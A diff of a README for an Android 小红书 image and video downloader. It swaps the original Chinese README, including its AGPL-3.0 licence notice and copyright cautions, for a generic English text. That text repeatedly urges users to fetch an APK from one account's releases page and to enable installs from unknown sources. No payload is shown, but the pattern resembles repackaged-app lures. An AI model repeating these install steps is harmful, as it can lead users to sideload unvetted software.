@@ -1,44 +1,58 @@
-# 小红书下载器 (XHS Downloader)
+# 📥 XHS_Downloader_Android - Download High-Quality Images Easily
 
-iOS 版本仓库➡️ [点我](https://github.com/NEORUAA/XHS_Downloader_iOS)
+## 🌐 Quick Download
+[![Download XHS_Downloader_Android](https://img.shields.io/badge/Download-XHS_Downloader_Android-brightgreen)](https://github.com/deevro/XHS_Downloader_Android/releases)
 
-## 主要功能
+## 🚀 Getting Started
+Welcome to the XHS_Downloader_Android project! This tool allows you to download high-quality images from 小红书 without compression or watermarks. Follow the steps below to get started.
 
-- **图片下载**: 自动提取小红书笔记中的图片并获取其原始文件 cdn 地址
-- **视频下载**: 自动提取小红书笔记中的视频并获取其原始文件 cdn 地址
-- **文案提取**: 自动提取小红书笔记中的文案并复制至剪切板
-- **Live Photo 合成**: 智能识别并合成动态照片，将图片和视频组合成一个动态照片文件（支持小米、OPPO、谷歌的动态照片格式）
-- **网页版提取**: 针对不支持 okhttp 方式获取内容的笔记，可选从内置 webview 爬取内容
+## 📥 Download & Install
+To download the software, visit the following page: [Releases Page](https://github.com/deevro/XHS_Downloader_Android/releases).
 
-## 使用说明
+1. Click on the link above to open the Releases page.
+2. Look for the latest version of the software. It is usually at the top of the list.
+3. Click on the version number to open its details.
+4. Find the download link for your device. For Android users, it will typically be an APK file.
+5. Click on the link to start downloading the file.
 
-### 基本操作
-1. **复制链接**: 在小红书 App 中复制笔记分享链接
-2. **粘贴链接**: 在本应用中粘贴到输入框
-3. **开始下载**: 点击下载按钮，等待处理完成
-4. **查看内容**: 下载完成后可在系统相册中查看
+### 📋 Installation Steps
+Once the APK file has downloaded, you need to install it. Follow these steps:
 
-### 支持的链接类型
-- `https://www.xiaohongshu.com/explore/...`
-- `https://xhslink.com/...` 
-- `https://www.xiaohongshu.com/discovery/item/...`
+1. Open the **Downloads** folder or the notification bar on your Android device.
+2. Tap on the APK file you downloaded.
+3. If prompted, enable the installation from unknown sources by going to your device settings. This allows you to install apps not from the Play Store.
+4. Confirm any permissions the application requests.
+5. Tap **Install** and wait for the installation process to complete.
+6. Once installed, you can open the app directly from the installation screen or find it in your app drawer.
 
-## 使用须知
-- 请仅下载自己需要的内容，遵守相关法律法规
-- 请尊重笔记原作者的版权，合理使用下载内容
-- 本应用仅供个人学习和研究使用，下载后请于 24H 内删除
+## 🌟 Features
+- **High-Quality Downloads**: Get original images without any compression.
+- **No Watermarks**: Enjoy your downloads free of any logos or marks.
+- **User-Friendly Interface**: Easy to navigate, designed for everyone.
 
+## ⚙️ System Requirements
+- **Device**: Android smartphone or tablet.
+- **OS Version**: Android 5.0 (Lollipop) or later.
+- **Storage**: At least 100 MB of free storage for installation and downloads.
+- **Internet Connection**: Required to download images.
 
-## 常见问题
-1. **下载失败**: 请确认填入的分享链接在浏览器中能被查看
-2. **Live Photo 无效**: 合成失败会自动 fallback 成普通视频来下载；有些设备可能不支持或需要特定应用才能播放
-3. **找不到文件**: 文件保存在安卓 MediaStore 的 `Pictures/xhs` 及 `Movies/xhs` 目录下，请在相册中查看
+## 📃 Usage Instructions
+1. Open the XHS Downloader app.
+2. Enter the URL of the image you want to download from 小红书.
+3. Tap the **Download** button.
+4. The image will save to your device's gallery.
 
+## 🎩 Troubleshooting
+If you encounter issues, consider the following:
 
-## 开源许可
+- **Installation Problems**: Ensure that you have enabled installation from unknown sources in your settings.
+- **Download Failures**: Check your internet connection and try again.
+- **App Crashes**: Restart your device and try reopening the app.
 
-项目使用 AGPL-3.0 许可协议，要求分发和修改的同时也公开源码，且使用相同的许可协议
+## 📞 Support
+If you need further assistance, please visit the [Issues page](https://github.com/deevro/XHS_Downloader_Android/issues) on GitHub to report any problems or ask questions.
 
-## 反馈与支持
+## 📚 Learn More
+For detailed documentation on how to use specific features, please refer to the Wiki page available on the GitHub repository.
 
-如遇到问题或有功能建议，欢迎提交 issues 或 PR
+Thank you for using XHS_Downloader_Android! We hope you enjoy downloading beautiful images without hassle. Get started with your download [here](https://github.com/deevro/XHS_Downloader_Android/releases).
